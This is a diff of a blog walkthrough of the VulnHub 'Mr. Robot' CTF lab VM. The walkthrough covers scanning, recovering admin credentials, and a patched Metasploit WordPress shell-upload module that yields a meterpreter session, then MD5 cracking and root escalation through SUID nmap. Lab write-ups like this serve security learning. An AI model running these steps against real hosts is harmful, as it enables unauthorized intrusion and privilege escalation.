@@ -32,7 +32,7 @@ The VM isn't too difficult. There isn't any advanced exploitation or reverse eng
 
 So the first step in any Pentest - whether it's Network or Web - (besides OSINT!) - is __Intelligence Gathering__. That includes [Footprinting](http://www.infosecwriters.com/text_resources/pdf/Footprinting.pdf) and [Fingerprinting](https://en.wikipedia.org/wiki/TCP/IP_stack_fingerprinting) hosts, servers, etc. If you want to learn more about the proper procedures and steps then I suggest you read the [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page).
 
-Since the __Mr.Robot__ VM is being hosted on my PC using a [Bridged Adapter](https://www.virtualbox.org/manual/ch06.html#network_bridged) over VirtualBox, we will go ahead and scan my network to see if we can't get the IP. To do so, type in `netdiscover` in our terminal.
+Since the __Mr.Robot__ VM is being hosted on my PC using a [Bridged Adapter](https://www.virtualbox.org/manual/ch06.html#network_bridged) over VirtualBox, we will go ahead and scan our network to see if we can't get the IP. To do so, type in `netdiscover` in your terminal.
 
 ```console
 root@kali:~# netdiscover
@@ -76,7 +76,7 @@ OS details: Linux 3.10 - 4.1
 Network Distance: 1 hop
 ```
 
-If you don't understand what my nmap command are doing, then read more about the nmap switches [here](https://nmap.org/book/man-briefoptions.html)!
+If you don't understand what my nmap commands are doing, then I suggest you read up on nmap switches, which can be found [here](https://nmap.org/book/man-briefoptions.html)!
 
 From our initial scans we can see that Ports 22, 80, and 443 are open. They seem to also be running [Apache HTTPD](https://httpd.apache.org/), which is an open source HTTP server. We thus can assume that this is a web server - and that ain't no lie, baby bye bye bye... (sorry got carried away).
 
@@ -120,15 +120,15 @@ A few interesting things come up in the scan.
 
 1. We see that the server is __leaking inodes via ETags__ in the header of __/robots.txt__. This relates to the [CVE-2003-1418](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418) vulnerability. These [Entity Tags](http://whatis.techtarget.com/definition/entity-tag-Etag) are an HTTP header which are used for Web cache validation and conditional requests from browsers for resources.
 2. Apache mod_negotiation is enabled with MultiViews, which will allow us to use a brute force attack in order to discover existing files on a server which uses [mod_negotiation](https://httpd.apache.org/docs/2.4/mod/mod_negotiation.html). 
-3. The following alternatives for 'index' were found: index.html, index.php. These can be used to provide us with more info on the website.
+3. The following alternatives for 'index' were found: __index.html__, and __index.php__. These can be used to provide us with more info on the website.
 4. OSVDB-3092: /admin/: This might be interesting... if we have a login. Good to keep that in the back of our mind.
-  * /admin/index.html: Admin login page/section found - also relates to the above scan.
-5. /readme.html: This WordPress file reveals the installed version.
-  * Basically tells us that this is a WordPress Site! So we know we can look for WordPress Exploits
-  * /wp-links-opml.php: This WordPress script reveals the installed version.
-  * /wp-login/: Admin login page/section found.
-  * /wp-admin/wp-login.php: Wordpress login found.
-6. OSVDB-3092: /license.txt: License file found may identify site software. Which can help us get version information of plugins and services to look for exploits.
+  * __/admin/index.html__: Admin login page/section found - also relates to the above scan.
+5. __/readme.html__: This WordPress file reveals the installed version.
+  * Basically tells us that this is a WordPress Site! So we know we can look for WordPress Vulnerabilities 
+  * __/wp-links-opml.php__: This WordPress script reveals the installed version.
+  * __/wp-login/__: Admin login page/section found.
+  * __/wp-admin/wp-login.php__: Wordpress login found.
+6. OSVDB-3092: __/license.txt__: License file found may identify site software. Which can help us get version information of plugins and services to look for exploits.
 
 Alright, we got our initial footprint, let's go ahead and access the website in our browser by navigating to __192.168.1.9__.
 
@@ -148,16 +148,18 @@ key-1-of-3.txt
 
 Nice! We got 2 locations we can navigate to __fsocity.dic__ and __key-1-of-3.txt__. Of course... I want the key! So let's navigate to __http://192.168.1.9/key-1-of-3.txt__.
 
-### Flag 1:
+### Key 1:
 ```
 073403c8a58a1f80d943455fb30724b9
 ```
 
 Yay! We got the fist key! Let's keep moving on... It ain't over yet, ain't over yet! Move, keep walkin’ until the mornin’ comes! (Sorry, got carried away again.)
 
-Since we got 2 locations from __/robots.txt__ let's navigate to __http://192.168.1.9/fsocity.dic__ and see what we get.
+Since we got 2 locations from __/robots.txt__, let's navigate to __http://192.168.1.9/fsocity.dic__ and see what we have left.
 
+<p align="center">
 <a href="/images/mrrobot2.PNG"><img src="/images/mrrobot2.PNG"></a>
+</p>
 
 Interesting... it appears to be a C Source Code file. Let's open it and see what it contains!
 
@@ -178,7 +180,7 @@ http
 
 Seems like a word list of some kind... It's possible that we can use this for brute forcing mod_negotiation... but let's save that for later!
 
-Let go ahead and try the next two locations we had __index.html__ and  __index.php__. After trying the html, my browser got stuck loading something... so I had to kill it. The .php file just took me back to the main page - but let's go ahead and view the source to see what we can find!
+We can now go ahead and try the next two locations that we got from our scan - __index.html__ and  __index.php__. After trying the .html file, my browser got stuck loading something... so I had to kill it. The .php file just took me back to the main page - but let's go ahead and view the source to see what we can find!
 
 ```html
 <!doctype html>
@@ -189,9 +191,15 @@ Let go ahead and try the next two locations we had __index.html__ and  __index.p
 -->
 ```
 
-That's actually cool! But - it doesn't help us at all! Okay, I'm going to go ahead and try the next location that nikto found, which is __/readme.html__. Let's go ahead and navigate to that!
+That's actually cool! But - it doesn't help us at all! 
 
-Alright, we now know that the WordPress site is Version 4.3.6, we can use that to our advantage later! Next best thing to try is the __/license.txt__. Let's navigate to that!
+Okay, I'm going to go ahead and try the next location that nikto found, which is __/readme.html__. This should provide us with the WordPress Version.
+
+<a href="/images/mrrobot4.PNG"><img src="/images/mrrobot4.PNG"></a>
+
+Alright, we now know that the WordPress site is Version 4.3.6, we can use that to our advantage later! Next best thing to try is the __/license.txt__ location.
+
+<a href="/images/mrrobot5.PNG"><img src="/images/mrrobot5.PNG"></a>
 
 When we arrive at the page, we can see that Mr. Robot is calling us a script kitty... okayyy. It seems there is more on the page, let's scroll down and see what we can find!
 
@@ -203,18 +211,20 @@ do you want a password or something?
 ZWxsaW90OkVSMjgtMDY1Mgo=
 ```
 
-Nice! We got the password to.. um.. something. It seems that the password is base64 encoded. Let's go ahead and decode it in our terminal!
+Nice! We got the password to... um… something. It seems that the password is base64 encoded. We can actually decode it in our terminal!
 
 ```console
 root@kali:~# echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 --decode
 elliot:ER28-0652
 ```
 
-Ok, we got a username and a password. I wonder where we can use this? Hmm.. let's try and use this login at the WordPress Admin Login Page, located at __/wp-login/__.
+Ok, we got a username and a password. I wonder where we can use this. Hmm… let's try and use the admin login page __/wp-login/__ that was found by nikto.
 
 <a href="/images/mrrobot3.PNG"><img src="/images/mrrobot3.PNG"></a>
 
-So we are logged in as Elliot as the WordPress Site admin. Let's scour around and see what we can find! From the looks of it, I see we have access to Updates and Plugins. Let's check the Plugins for versions.
+Once we are logged in as Elliot, we also see that we are the WordPress Site admin. Let's scour around and see what we can find! 
+
+From the looks of it, I see we have access to Updates and Plugins. We can go ahead and check Plugin versions.
 
 Upon checking Plugins, we get the following:
 
@@ -230,7 +240,9 @@ Upon checking Plugins, we get the following:
 * WP-Mail-SMTP - Version 0.9.5
 * WPtouch Mobile Plugin - Version 3.7.3
 
-With this, I will go ahead and run [wpscan](https://github.com/wpscanteam/wpscan), to check WordPress for any possible vulnerability. So far we know the WP Version is 4.6.3 and we know the plugin versions. This can be used to rule out any false positives by the wpscan.
+With this, I will go ahead and run [wpscan](https://github.com/wpscanteam/wpscan), to check WordPress for any possible vulnerability’s.
+
+So far - we know the WordPress Version is 4.6.3, and we know the plugin versions that are used on the page. This can be used to rule out any false positives by the wpscan.
 
 ```console
 root@cryptic:~# wpscan -u 192.168.1.9 -e vp
@@ -461,9 +473,9 @@ _______________________________________________________________
 [+] Elapsed time: 00:00:35
 ```
 
-A ton of possible [XSS Vulnerabilities](https://en.wikipedia.org/wiki/Cross-site_scripting), and a lot of outdated versions. Unfortunately I don't see any [RCE Exploits](http://searchwindowsserver.techtarget.com/definition/remote-code-execution-RCE).
+A ton of possible [XSS Vulnerabilities](https://en.wikipedia.org/wiki/Cross-site_scripting), and a lot of outdated versions. Unfortunately I don't see any [RCE Exploits](http://searchwindowsserver.techtarget.com/definition/remote-code-execution-RCE), or anything particularly good that we can use against the host.
 
-Well, since I already have admin credentials, and logged in... let's just go ahead and see if we can upload a [shell](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload). We will be using [Metasploit](https://www.metasploit.com/) for this.
+Since I already have admin credentials, and I'm logged in... let's just go ahead and see if we can upload an [admin shell](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload). We will be using [Metasploit](https://www.metasploit.com/) for this.
 
 ```console
 root@kali:~# msfconsole
@@ -514,7 +526,9 @@ msf exploit(wp_admin_shell_upload) > exploit
 [*] Exploit completed, but no session was created.
 ```
 
-Oh... what? It seems that the exploit is working, but the website isn't being detected as a WordPress Site. Looking at the [source code](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_admin_shell_upload.rb) for the exploit, I feel that the following code is causing problems.
+Oh... what? It seems that the exploit is working, but the website isn't being detected as a WordPress site.
+
+Looking at the [source code](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/wp_admin_shell_upload.rb) for the exploit, I feel that the following line is causing problems.
 
 ```ruby
 fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?
@@ -526,7 +540,7 @@ So I went ahead and opened the exploit to edit it...
 root@cryptic:~# gedit /usr/share/metasploit-framework/modules/exploits/unix/webapp/wp_admin_shell_upload.rb
 ```
 
-And commented out the __fail_with__ error to prevent the shell from failing upon WordPress detection.
+Once open, I commented out the __fail_with__ error (usign the # character) to prevent the shell from failing upon WordPress detection.
 
 ```ruby
  def exploit
@@ -554,7 +568,7 @@ msf exploit(wp_admin_shell_upload) > exploit
 meterpreter > 
 ```
 
-Awesome! We got the shell up and running on the server! Let's see what privileges we have, and then let's snoop around to see what we can find!
+Awesome! We got the shell up and running on the host! Let's snoop around to see what we can find!
 
 ```console
 meterpreter > pwd
@@ -614,7 +628,9 @@ meterpreter > cat password.raw-md5
 robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
 
-Alright, it seems that we have an [MD5 Hash](https://en.wikipedia.org/wiki/MD5) with the username __robot__. Let's go to [HashKIller](https://hashkiller.co.uk/md5-decrypter.aspx) online and see if we can crack the MD5 hash.
+Alright, it seems that we have an [MD5 Hash](https://en.wikipedia.org/wiki/MD5) with the username __robot__. Let's go to [HashKiller](https://hashkiller.co.uk/md5-decrypter.aspx) online and see if it can crack the MD5 hash for us.
+
+You can use [HashCat](https://hashcat.net/hashcat/) if you wanted to, but I figured that this was going to be faster.
 
 ```
 c3fcd3d76192e4007dfb496cca67e13b MD5 : abcdefghijklmnopqrstuvwxyz
@@ -622,7 +638,7 @@ c3fcd3d76192e4007dfb496cca67e13b MD5 : abcdefghijklmnopqrstuvwxyz
 
 Geez, what a shitty password! Who cares, it was easy for us to crack!
 
-Since we have a password, and a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) session on the server, let's see if we can drop into a shell and login as the user __robot__.
+Since we have a password, and a [Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) session on the host, let's see if we can drop into a shell and login as the user __robot__.
 
 ```console
 meterpreter > shell
@@ -630,16 +646,17 @@ Process 2094 created.
 Channel 1 created.
 ```
 
-Okay, we got shell! Now we want to be able to login to __robot__ so what we need is to establish a [TTY](http://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con). We can do so by typing the following line:
+Okay, we got shell! Now we want to be able to login to __robot__. So what we need to do is establish a [TTY Shell](http://unix.stackexchange.com/questions/4126/what-is-the-exact-difference-between-a-terminal-a-shell-a-tty-and-a-con). We can do so by typing the following line:
 
 ```console
 python -c 'import pty; pty.spawn("/bin/sh")'
-$
 ```
 
-Here is a good resource where you can read more about [Spawning a TTY Shell](http://netsec.ws/?p=337). Once in, let's go ahead and change user, and get the second flag!
+Here is a good resource where you can read more about [Spawning a TTY Shell](http://netsec.ws/?p=337). 
 
-### Flag 2:
+Once in, we can login as __robot__ and get the second flag!
+
+### Key 2:
 
 ```console
 $ su robot
@@ -654,11 +671,11 @@ cat key-2-of-3.txt
 822c73956184f694993bede3eb39f959
 ```
 
-Okay, go do a victory lap around the house! We deserve it! Though... we are still not done. We still got 1 more flag to find.
+Okay, go do a victory lap around the house! You deserve it! Though... we're still not done. Still got 1 more flag to find!
 
-Since we exploited the server, and got it - our next step is to carry our [Post-Explotation](http://www.pentest-standard.org/index.php/Post_Exploitation) and further Enumeration on the internal side.
+Since we exploited the host, and got in - our next step is to carry out [Post-Explotation](http://www.pentest-standard.org/index.php/Post_Exploitation) and further Enumeration on the internal side.
 
-What I like doing is running an nmap scan if possible to enumerate open ports, and internal machines - so let's see if we enumerate ports on the localhost.
+What I like doing is running an nmap scan if possible to enumerate open ports, and internal machines - so let's see if we can enumerate ports on the localhost.
 
 ```console
 robot@linux:~$ nmap localhost
@@ -687,9 +704,9 @@ cd /root
 bash: cd: /root: Permission denied
 ```
 
-Crap... looks like I have to do some privilege escalation to be able to access that. I spent some time looking for exploits to escalate my privileges... until it hit me!
+Crap... looks like I have to do some [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation) to be able to access that. I spent some time looking for exploits to escalate my privileges... until it hit me!
 
-The host has nmap installed, which could possibly allow me to run commands in root, due to the way SUID flags might be set.
+The host has nmap installed, which could possibly allow me to run commands as root, due to the way [SUID](http://www.linuxnix.com/suid-set-suid-linuxunix/) flags might be set.
 
 Let's check the version first!
 
@@ -717,7 +734,7 @@ uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
 cd /root
 ```
 
-###Flag 3:
+### Key 3:
 
 ```
 # cat key-3-of-3.txt
@@ -727,14 +744,14 @@ cat key-3-of-3.txt
 
 ## Closing:
 
-And there we have it! We captured all three flags, and rooted the system! 
+And there we have it! We captured all three keys, and rooted the system! 
 
 <a href="https://media.giphy.com/media/mQG644PY8O7rG/giphy.gif"><img src="https://media.giphy.com/media/mQG644PY8O7rG/giphy.gif"></a>
 
 If this was a real engagement, we would be able to do a lot more damage, now that we have root privileges. Well, I hoped you guys enjoyed this post as much as I enjoyed pwning Mr. Robot! 
 
-This box was really well put together and honestly challenged me - at the same time I learned a lot, along with many valuable lessons. 
+This box was really well put together and honestly challenged me - at the same time I learned a lot about the hacking process and some new exploitations, along with many valuable lessons.
 
-Stay tuned for more VulnHub Write-Ups, OTH, and more! Also - I will be competing in this year’s [NCL - National Cyber League CTF](http://www.nationalcyberleague.org/), so expect some future write-ups om that!
+Stay tuned for more VulnHub Write-Ups, OTH, and more! Also - I will be competing in this year’s [NCL - National Cyber League](http://www.nationalcyberleague.org/), so expect some future write-ups om that!
 
 Cheers!
